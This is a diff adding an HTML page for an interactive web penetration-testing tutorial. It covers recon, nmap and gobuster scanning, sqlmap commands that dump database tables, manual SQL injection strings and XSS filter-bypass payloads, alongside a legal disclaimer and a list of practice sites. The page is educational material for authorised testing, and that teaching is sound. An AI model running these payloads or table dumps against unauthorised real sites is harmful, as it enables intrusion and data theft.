@@ -1,0 +1,1150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Security Testing Guide - Interactive Learning</title>
+    <style>
+        :root {
+            --primary: #00d9ff;
+            --secondary: #ff006e;
+            --success: #06ffa5;
+            --warning: #ffbe0b;
+            --danger: #ff006e;
+            --dark: #0a0e27;
+            --darker: #050814;
+            --light: #f0f0f0;
+            --code-bg: #1e1e1e;
+            --border: #2a2a2a;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--darker);
+            color: var(--light);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 0;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            background: var(--dark);
+            padding: 20px;
+            position: sticky;
+            top: 0;
+            height: 100vh;
+            overflow-y: auto;
+            border-right: 1px solid var(--border);
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            color: var(--primary);
+            text-align: center;
+        }
+
+        .logo span {
+            color: var(--secondary);
+        }
+
+        .search-box {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border);
+            background: var(--darker);
+            color: var(--light);
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .nav-section {
+            margin-bottom: 20px;
+        }
+
+        .nav-section h3 {
+            font-size: 12px;
+            text-transform: uppercase;
+            color: var(--primary);
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+
+        .nav-item {
+            padding: 10px 15px;
+            cursor: pointer;
+            border-radius: 6px;
+            margin-bottom: 5px;
+            transition: all 0.3s;
+            font-size: 14px;
+            border-left: 3px solid transparent;
+        }
+
+        .nav-item:hover {
+            background: var(--darker);
+            border-left-color: var(--primary);
+            padding-left: 18px;
+        }
+
+        .nav-item.active {
+            background: var(--darker);
+            border-left-color: var(--primary);
+            color: var(--primary);
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 40px;
+            background: var(--darker);
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            padding: 40px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 42px;
+            margin-bottom: 10px;
+            color: white;
+        }
+
+        .header p {
+            font-size: 18px;
+            opacity: 0.9;
+            color: white;
+        }
+
+        .progress-bar {
+            background: var(--dark);
+            height: 6px;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-fill {
+            background: linear-gradient(90deg, var(--primary), var(--success));
+            height: 100%;
+            width: 0%;
+            transition: width 0.5s;
+        }
+
+        .content-section {
+            display: none;
+            animation: fadeIn 0.3s;
+        }
+
+        .content-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .section-card {
+            background: var(--dark);
+            padding: 30px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border);
+        }
+
+        .section-card h2 {
+            color: var(--primary);
+            margin-bottom: 15px;
+            font-size: 28px;
+        }
+
+        .section-card h3 {
+            color: var(--success);
+            margin: 20px 0 10px 0;
+            font-size: 20px;
+        }
+
+        .section-card p {
+            margin-bottom: 15px;
+            color: #ccc;
+        }
+
+        .code-block {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .code-lang {
+            color: var(--primary);
+            font-size: 12px;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .copy-btn {
+            background: var(--primary);
+            color: var(--dark);
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .copy-btn:hover {
+            background: var(--success);
+            transform: scale(1.05);
+        }
+
+        .copy-btn.copied {
+            background: var(--success);
+        }
+
+        .code-block pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .code-block code {
+            color: #e0e0e0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .bash { color: #00d9ff; }
+        .comment { color: #6c757d; }
+        .keyword { color: #ff006e; }
+        .string { color: #06ffa5; }
+
+        .info-box {
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid;
+        }
+
+        .info-box.critical {
+            background: rgba(255, 0, 110, 0.1);
+            border-color: var(--danger);
+        }
+
+        .info-box.warning {
+            background: rgba(255, 190, 11, 0.1);
+            border-color: var(--warning);
+        }
+
+        .info-box.success {
+            background: rgba(6, 255, 165, 0.1);
+            border-color: var(--success);
+        }
+
+        .info-box.info {
+            background: rgba(0, 217, 255, 0.1);
+            border-color: var(--primary);
+        }
+
+        .info-box strong {
+            display: block;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        .tag {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin: 5px 5px 5px 0;
+            font-weight: bold;
+        }
+
+        .tag.easy { background: rgba(6, 255, 165, 0.2); color: var(--success); }
+        .tag.medium { background: rgba(255, 190, 11, 0.2); color: var(--warning); }
+        .tag.hard { background: rgba(255, 0, 110, 0.2); color: var(--danger); }
+
+        .collapsible {
+            background: var(--dark);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+
+        .collapsible-header {
+            padding: 15px 20px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.3s;
+        }
+
+        .collapsible-header:hover {
+            background: var(--darker);
+        }
+
+        .collapsible-header h4 {
+            color: var(--primary);
+            font-size: 16px;
+        }
+
+        .collapsible-icon {
+            transition: transform 0.3s;
+        }
+
+        .collapsible.open .collapsible-icon {
+            transform: rotate(180deg);
+        }
+
+        .collapsible-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+        }
+
+        .collapsible.open .collapsible-content {
+            max-height: 2000px;
+        }
+
+        .collapsible-body {
+            padding: 20px;
+            border-top: 1px solid var(--border);
+        }
+
+        .practice-card {
+            background: linear-gradient(135deg, rgba(0, 217, 255, 0.1) 0%, rgba(255, 0, 110, 0.1) 100%);
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border: 1px solid var(--border);
+        }
+
+        .practice-card h3 {
+            color: var(--primary);
+            margin-bottom: 15px;
+        }
+
+        .practice-btn {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 15px;
+            transition: transform 0.3s;
+        }
+
+        .practice-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .stat-card {
+            background: var(--dark);
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid var(--border);
+        }
+
+        .stat-number {
+            font-size: 36px;
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 14px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        ul {
+            margin: 15px 0;
+            padding-left: 25px;
+        }
+
+        li {
+            margin: 8px 0;
+            color: #ccc;
+        }
+
+        .scroll-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--primary);
+            color: var(--dark);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .scroll-top.show {
+            opacity: 1;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+
+            .sidebar {
+                position: relative;
+                height: auto;
+            }
+
+            .main-content {
+                padding: 20px;
+            }
+
+            .header h1 {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="logo">🔐 <span>Hack</span>Learn</div>
+            
+            <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search commands...">
+
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <div class="nav-section">
+                <h3>📚 Phases</h3>
+                <div class="nav-item active" data-section="home">🏠 Home</div>
+                <div class="nav-item" data-section="phase1">Phase 1: Reconnaissance</div>
+                <div class="nav-item" data-section="phase2">Phase 2: Scanning</div>
+                <div class="nav-item" data-section="phase3">Phase 3: Vulnerabilities</div>
+                <div class="nav-item" data-section="phase4">Phase 4: WordPress</div>
+                <div class="nav-item" data-section="phase5">Phase 5: Reporting</div>
+            </div>
+
+            <div class="nav-section">
+                <h3>🎯 Quick Access</h3>
+                <div class="nav-item" data-section="sqlinjection">SQL Injection</div>
+                <div class="nav-item" data-section="xss">XSS Testing</div>
+                <div class="nav-item" data-section="practice">Practice Sites</div>
+                <div class="nav-item" data-section="checklist">Testing Checklist</div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Home Section -->
+            <div class="content-section active" id="home">
+                <div class="header">
+                    <h1>🔐 Web Security Testing Guide</h1>
+                    <p>Your Complete Interactive Learning Platform for Ethical Hacking</p>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-number">200+</div>
+                        <div class="stat-label">Commands</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">5</div>
+                        <div class="stat-label">Testing Phases</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">20+</div>
+                        <div class="stat-label">Vulnerabilities</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">100%</div>
+                        <div class="stat-label">Practical</div>
+                    </div>
+                </div>
+
+                <div class="section-card">
+                    <h2>🚀 Welcome to Your Hacking Journey!</h2>
+                    <p>This interactive guide will teach you professional web application penetration testing from scratch. Each command is explained, copyable, and comes with real-world examples.</p>
+
+                    <div class="info-box critical">
+                        <strong>⚠️ Legal Disclaimer</strong>
+                        <p>ALWAYS get written permission before testing ANY website. Unauthorized hacking is ILLEGAL and can result in imprisonment (3-10 years) and heavy fines (₹5-50 lakhs in India).</p>
+                    </div>
+
+                    <h3>📖 How to Use This Guide</h3>
+                    <ul>
+                        <li><strong>Navigate:</strong> Use sidebar to jump between phases</li>
+                        <li><strong>Search:</strong> Use search box to find specific commands</li>
+                        <li><strong>Copy:</strong> Click copy button on any code block</li>
+                        <li><strong>Practice:</strong> Try commands on legal practice sites first</li>
+                        <li><strong>Track:</strong> Progress bar shows your learning journey</li>
+                    </ul>
+
+                    <h3>🎯 Learning Path (8 Weeks)</h3>
+                    <div class="collapsible">
+                        <div class="collapsible-header">
+                            <h4>Week 1-2: Reconnaissance & Basics</h4>
+                            <span class="collapsible-icon">▼</span>
+                        </div>
+                        <div class="collapsible-content">
+                            <div class="collapsible-body">
+                                <p>Master information gathering techniques:</p>
+                                <ul>
+                                    <li>WHOIS lookup and DNS enumeration</li>
+                                    <li>Subdomain discovery</li>
+                                    <li>Technology detection</li>
+                                    <li>Google dorking</li>
+                                </ul>
+                                <span class="tag easy">Beginner Friendly</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="collapsible">
+                        <div class="collapsible-header">
+                            <h4>Week 3-4: Scanning & Enumeration</h4>
+                            <span class="collapsible-icon">▼</span>
+                        </div>
+                        <div class="collapsible-content">
+                            <div class="collapsible-body">
+                                <p>Learn to find open doors:</p>
+                                <ul>
+                                    <li>Port scanning with Nmap</li>
+                                    <li>Directory enumeration with Gobuster</li>
+                                    <li>SSL/TLS testing</li>
+                                    <li>Service fingerprinting</li>
+                                </ul>
+                                <span class="tag easy">Beginner Friendly</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="collapsible">
+                        <div class="collapsible-header">
+                            <h4>Week 5-6: Vulnerability Testing</h4>
+                            <span class="collapsible-icon">▼</span>
+                        </div>
+                        <div class="collapsible-content">
+                            <div class="collapsible-body">
+                                <p>Identify security weaknesses:</p>
+                                <ul>
+                                    <li>SQL injection testing</li>
+                                    <li>XSS vulnerability detection</li>
+                                    <li>IDOR testing</li>
+                                    <li>Authentication bypass</li>
+                                </ul>
+                                <span class="tag medium">Intermediate</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="collapsible">
+                        <div class="collapsible-header">
+                            <h4>Week 7-8: Reporting & Real Projects</h4>
+                            <span class="collapsible-icon">▼</span>
+                        </div>
+                        <div class="collapsible-content">
+                            <div class="collapsible-body">
+                                <p>Professional penetration testing:</p>
+                                <ul>
+                                    <li>Professional report writing</li>
+                                    <li>Evidence documentation</li>
+                                    <li>Client communication</li>
+                                    <li>First paid project</li>
+                                </ul>
+                                <span class="tag medium">Intermediate</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="practice-card">
+                    <h3>🎮 Ready to Practice?</h3>
+                    <p>Start with these LEGAL practice websites where you can test safely:</p>
+                    <ul>
+                        <li><strong>testphp.vulnweb.com</strong> - Vulnerable web app for SQL injection practice</li>
+                        <li><strong>hack-yourself-first.com</strong> - Troy Hunt's practice platform</li>
+                        <li><strong>dvwa.co.uk</strong> - Damn Vulnerable Web Application</li>
+                        <li><strong>hackthebox.eu</strong> - Professional hacking challenges</li>
+                    </ul>
+                    <button class="practice-btn" onclick="showSection('practice')">View All Practice Sites →</button>
+                </div>
+            </div>
+
+            <!-- Phase 1: Reconnaissance -->
+            <div class="content-section" id="phase1">
+                <div class="section-card">
+                    <h2>🔍 Phase 1: Reconnaissance & Information Gathering</h2>
+                    <p>Reconnaissance is the foundation of penetration testing. This phase helps you understand the target, find entry points, and gather valuable intelligence.</p>
+
+                    <div class="info-box info">
+                        <strong>⏱️ Time Required</strong>
+                        <p>2-4 hours for comprehensive reconnaissance</p>
+                    </div>
+
+                    <h3>1.1 WHOIS Lookup</h3>
+                    <p><strong>Purpose:</strong> Get domain registration info, owner details, nameservers</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">bash</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code><span class="comment"># Basic WHOIS lookup</span>
+<span class="bash">whois target.com</span>
+<span class="comment"># Shows: Owner name, email, phone, registration date, expiry</span>
+
+<span class="comment"># Save to file</span>
+<span class="bash">whois target.com > /mnt/usb/recon/whois.txt</span>
+
+<span class="comment"># Bulk WHOIS lookup</span>
+<span class="keyword">for</span> domain <span class="keyword">in</span> target1.com target2.com target3.com; <span class="keyword">do</span>
+    echo <span class="string">"=== $domain ==="</span> >> /mnt/usb/recon/bulk-whois.txt
+    whois $domain >> /mnt/usb/recon/bulk-whois.txt
+<span class="keyword">done</span></code></pre>
+                    </div>
+
+                    <div class="info-box success">
+                        <strong>💡 What to Look For</strong>
+                        <ul>
+                            <li>Admin email (for responsible disclosure)</li>
+                            <li>Nameservers (DNS provider)</li>
+                            <li>Registration date (old = possibly outdated security)</li>
+                            <li>Expiry date (about to expire = vulnerable)</li>
+                        </ul>
+                    </div>
+
+                    <h3>1.2 DNS Enumeration</h3>
+                    <p><strong>Purpose:</strong> Find all DNS records, subdomains, mail servers</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">bash</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code><span class="comment"># Get ALL DNS records</span>
+<span class="bash">dig target.com ANY</span>
+
+<span class="comment"># Specific record types</span>
+<span class="bash">dig target.com A</span>          <span class="comment"># IPv4 address</span>
+<span class="bash">dig target.com MX</span>         <span class="comment"># Mail servers</span>
+<span class="bash">dig target.com NS</span>         <span class="comment"># Nameservers</span>
+<span class="bash">dig target.com TXT</span>        <span class="comment"># Text records</span>
+
+<span class="comment"># DNS zone transfer (often fails, but try!)</span>
+<span class="bash">dig @ns1.target.com target.com AXFR</span>
+<span class="comment"># If successful = HUGE INFO LEAK!</span></code></pre>
+                    </div>
+
+                    <h3>1.3 Subdomain Enumeration</h3>
+                    <p><strong>Purpose:</strong> Find hidden subdomains (admin.target.com, dev.target.com)</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">bash</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code><span class="comment"># Sublist3r (Fast, uses multiple sources)</span>
+<span class="bash">sublist3r -d target.com -o /mnt/usb/recon/subdomains.txt</span>
+
+<span class="comment"># Assetfinder (Quick discovery)</span>
+<span class="bash">assetfinder target.com | tee /mnt/usb/recon/assetfinder.txt</span>
+
+<span class="comment"># Combine results and remove duplicates</span>
+<span class="bash">cat /mnt/usb/recon/*subdomains.txt | sort -u > /mnt/usb/recon/all-subdomains.txt</span></code></pre>
+                    </div>
+
+                    <div class="info-box warning">
+                        <strong>🎯 Valuable Subdomains to Find</strong>
+                        <ul>
+                            <li>admin.target.com - Admin panels</li>
+                            <li>dev.target.com - Development servers (often less secure)</li>
+                            <li>staging.target.com - Staging environments</li>
+                            <li>api.target.com - API endpoints</li>
+                        </ul>
+                    </div>
+
+                    <h3>1.4 Technology Detection</h3>
+                    <p><strong>Purpose:</strong> Identify CMS, frameworks, server software</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">bash</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code><span class="comment"># WhatWeb (Comprehensive)</span>
+<span class="bash">whatweb target.com</span>
+
+<span class="comment"># Verbose mode (more details)</span>
+<span class="bash">whatweb -v target.com</span>
+
+<span class="comment"># Manual detection with curl</span>
+<span class="bash">curl -I target.com</span>
+<span class="comment"># Check headers: Server, X-Powered-By, X-Generator</span>
+
+<span class="comment"># Check common files</span>
+<span class="bash">curl http://target.com/robots.txt</span>
+<span class="bash">curl http://target.com/readme.html</span></code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Phase 2: Scanning -->
+            <div class="content-section" id="phase2">
+                <div class="section-card">
+                    <h2>🔎 Phase 2: Scanning & Enumeration</h2>
+                    
+                    <h3>2.1 Port Scanning</h3>
+                    <p><strong>Purpose:</strong> Find open ports and running services</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">bash</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code><span class="comment"># QUICK SCAN (top 1000 ports)</span>
+<span class="bash">nmap target.com</span>
+
+<span class="comment"># SERVICE VERSION DETECTION</span>
+<span class="bash">nmap -sV target.com</span>
+
+<span class="comment"># AGGRESSIVE SCAN (OS, version, scripts)</span>
+<span class="bash">nmap -A target.com</span>
+
+<span class="comment"># SAVE RESULTS</span>
+<span class="bash">nmap -sV -sC -p- -oA /mnt/usb/scans/full-scan target.com</span></code></pre>
+                    </div>
+
+                    <div class="info-box critical">
+                        <strong>🚨 Critical Findings to Report</strong>
+                        <ul>
+                            <li>Port 3306 (MySQL) open = Database exposed to internet (CRITICAL!)</li>
+                            <li>Port 21 (FTP) open = Old protocol, often has exploits</li>
+                            <li>Port 23 (Telnet) open = Unencrypted, very insecure (CRITICAL!)</li>
+                        </ul>
+                    </div>
+
+                    <h3>2.2 Directory Enumeration</h3>
+                    <p><strong>Purpose:</strong> Find hidden directories and files</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">bash</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code><span class="comment"># GOBUSTER (Fast, recommended)</span>
+<span class="bash">gobuster dir -u http://target.com \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php,html,txt,zip,bak \
+  -o /mnt/usb/enum/gobuster.txt</span>
+
+<span class="comment"># Find backup files</span>
+<span class="bash">gobuster dir -u http://target.com \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x .bak,.old,.backup,.zip,.sql</span></code></pre>
+                    </div>
+
+                    <div class="info-box success">
+                        <strong>💰 High-Value Findings</strong>
+                        <ul>
+                            <li>/admin, /administrator = Admin panels</li>
+                            <li>/backup.zip = CRITICAL - Exposed backups</li>
+                            <li>/.git = CRITICAL - Source code exposed</li>
+                            <li>/.env = CRITICAL - API keys, passwords</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SQL Injection -->
+            <div class="content-section" id="sqlinjection">
+                <div class="section-card">
+                    <h2>💉 SQL Injection Testing</h2>
+                    <p>SQL injection is one of the most critical vulnerabilities. It allows attackers to access and manipulate databases.</p>
+
+                    <div class="info-box critical">
+                        <strong>⚠️ Severity: CRITICAL</strong>
+                        <p>SQL injection can lead to complete database compromise, data theft, and admin access.</p>
+                    </div>
+
+                    <h3>Automated Testing with SQLMap</h3>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">bash</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code><span class="comment"># Basic SQL injection test</span>
+<span class="bash">sqlmap -u "http://target.com/page.php?id=1"</span>
+
+<span class="comment"># Get database names</span>
+<span class="bash">sqlmap -u "http://target.com/page.php?id=1" --dbs</span>
+
+<span class="comment"># Get tables from database</span>
+<span class="bash">sqlmap -u "http://target.com/page.php?id=1" \
+  -D database_name --tables</span>
+
+<span class="comment"># Dump users table</span>
+<span class="bash">sqlmap -u "http://target.com/page.php?id=1" \
+  -D database_name \
+  -T users \
+  --dump</span>
+
+<span class="comment"># Test POST request</span>
+<span class="bash">sqlmap -u "http://target.com/login.php" \
+  --data="username=admin&password=test"</span></code></pre>
+                    </div>
+
+                    <h3>Manual Testing Payloads</h3>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">sql</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code><span class="comment">-- Test these payloads in URL parameters:</span>
+
+<span class="string">' OR '1'='1</span>
+<span class="string">' OR '1'='1' --</span>
+<span class="string">' OR '1'='1' /*</span>
+<span class="string">admin' --</span>
+<span class="string">admin' #</span>
+<span class="string">1' ORDER BY 1--</span>
+<span class="string">1' UNION SELECT NULL--</span>
+<span class="string">1' UNION SELECT @@version,NULL--</span></code></pre>
+                    </div>
+
+                    <div class="info-box warning">
+                        <strong>⚠️ Error Messages that Confirm SQLi</strong>
+                        <ul>
+                            <li>"You have an error in your SQL syntax"</li>
+                            <li>"mysql_fetch_array()"</li>
+                            <li>"Warning: mysql_query()"</li>
+                            <li>"ORA-01756: quoted string not properly terminated"</li>
+                        </ul>
+                    </div>
+
+                    <div class="practice-card">
+                        <h3>🎯 Practice SQL Injection</h3>
+                        <p>Test on this legal vulnerable website:</p>
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-lang">bash</span>
+                                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            </div>
+                            <pre><code><span class="bash">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs</span></code></pre>
+                        </div>
+                        <p><strong>Expected Result:</strong> You'll find 2 databases (acuart, information_schema)</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- XSS Testing -->
+            <div class="content-section" id="xss">
+                <div class="section-card">
+                    <h2>🎭 XSS (Cross-Site Scripting) Testing</h2>
+                    
+                    <h3>Basic XSS Payloads</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">html</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;
+&lt;body onload=alert('XSS')&gt;</code></pre>
+                    </div>
+
+                    <h3>Bypass Filter Techniques</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">html</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+                        <pre><code>&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;
+&lt;img src=x onerror=alert`XSS`&gt;
+&lt;svg/onload=alert('XSS')&gt;</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Practice Sites -->
+            <div class="content-section" id="practice">
+                <div class="section-card">
+                    <h2>🎮 Legal Practice Websites</h2>
+                    <p>These websites are DESIGNED to be hacked. Perfect for safe, legal practice!</p>
+
+                    <div class="collapsible open">
+                        <div class="collapsible-header">
+                            <h4>🌐 testphp.vulnweb.com</h4>
+                            <span class="collapsible-icon">▼</span>
+                        </div>
+                        <div class="collapsible-content">
+                            <div class="collapsible-body">
+                                <p><strong>Best for:</strong> SQL Injection, XSS, Directory Traversal</p>
+                                <div class="code-block">
+                                    <div class="code-header">
+                                        <span class="code-lang">bash</span>
+                                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                    </div>
+                                    <pre><code><span class="comment"># Try these commands:</span>
+<span class="bash">whatweb http://testphp.vulnweb.com</span>
+<span class="bash">nmap testphp.vulnweb.com</span>
+<span class="bash">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs</span></code></pre>
+                                </div>
+                                <span class="tag easy">Beginner Friendly</span>
+                                <span class="tag medium">SQL Injection</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="collapsible">
+                        <div class="collapsible-header">
+                            <h4>🎯 HackTheBox.eu</h4>
+                            <span class="collapsible-icon">▼</span>
+                        </div>
+                        <div class="collapsible-content">
+                            <div class="collapsible-body">
+                                <p><strong>Best for:</strong> Real-world pentesting scenarios, CTF challenges</p>
+                                <p>Sign up free, get access to retired machines, earn points!</p>
+                                <span class="tag medium">Intermediate</span>
+                                <span class="tag hard">Advanced</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="collapsible">
+                        <div class="collapsible-header">
+                            <h4>🔥 TryHackMe.com</h4>
+                            <span class="collapsible-icon">▼</span>
+                        </div>
+                        <div class="collapsible-content">
+                            <div class="collapsible-body">
+                                <p><strong>Best for:</strong> Guided learning paths, step-by-step tutorials</p>
+                                <p>Perfect for beginners with structured courses!</p>
+                                <span class="tag easy">Beginner Friendly</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Testing Checklist -->
+            <div class="content-section" id="checklist">
+                <div class="section-card">
+                    <h2>✅ Professional Testing Checklist</h2>
+                    
+                    <h3>📋 Pre-Engagement</h3>
+                    <div class="info-box critical">
+                        <input type="checkbox"> Get written permission/contract<br>
+                        <input type="checkbox"> Define scope clearly<br>
+                        <input type="checkbox"> Set up testing environment<br>
+                        <input type="checkbox"> Prepare USB drive with wordlists
+                    </div>
+
+                    <h3>Phase 1: Reconnaissance (2-4 hours)</h3>
+                    <div class="info-box info">
+                        <input type="checkbox"> WHOIS lookup<br>
+                        <input type="checkbox"> DNS enumeration<br>
+                        <input type="checkbox"> Subdomain discovery<br>
+                        <input type="checkbox"> Technology detection<br>
+                        <input type="checkbox"> Google dorking
+                    </div>
+
+                    <h3>Phase 2: Scanning (2-4 hours)</h3>
+                    <div class="info-box info">
+                        <input type="checkbox"> Port scan (nmap)<br>
+                        <input type="checkbox"> Directory enumeration (gobuster)<br>
+                        <input type="checkbox"> Technology fingerprinting<br>
+                        <input type="checkbox"> SSL/TLS testing
+                    </div>
+
+                    <h3>Phase 3: Vulnerability Testing (4-8 hours)</h3>
+                    <div class="info-box warning">
+                        <input type="checkbox"> SQL injection testing<br>
+                        <input type="checkbox"> XSS testing<br>
+                        <input type="checkbox"> File upload testing<br>
+                        <input type="checkbox"> IDOR testing<br>
+                        <input type="checkbox"> Authentication testing<br>
+                        <input type="checkbox"> WordPress testing (if applicable)
+                    </div>
+
+                    <h3>Phase 4: Documentation (2-4 hours)</h3>
+                    <div class="info-box success">
+                        <input type="checkbox"> Screenshot all findings<br>
+                        <input type="checkbox"> Save all evidence<br>
+                        <input type="checkbox"> Rate vulnerabilities by severity<br>
+                        <input type="checkbox"> Write professional report
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="scroll-top" id="scrollTop" onclick="scrollToTop()">↑</div>
+
+    <script>
+        // Navigation
+        const navItems = document.querySelectorAll('.nav-item');
+        const sections = document.querySelectorAll('.content-section');
+        
+        navItems.forEach(item => {
+            item.addEventListener('click', () => {
+                const targetSection = item.dataset.section;
+                showSection(targetSection);
+                
+                navItems.forEach(nav => nav.classList.remove('active'));
+                item.classList.add('active');
+                
+                updateProgress();
+            });
+        });
+
+        function showSection(sectionId) {
+            sections.forEach(section => {
+                section.classList.remove('active');
+                if (section.id === sectionId) {
+                    section.classList.add('active');
+                }
+            });
+            window.scrollTo(0, 0);
+        }
+
+        // Copy Code Function
+        function copyCode(button) {
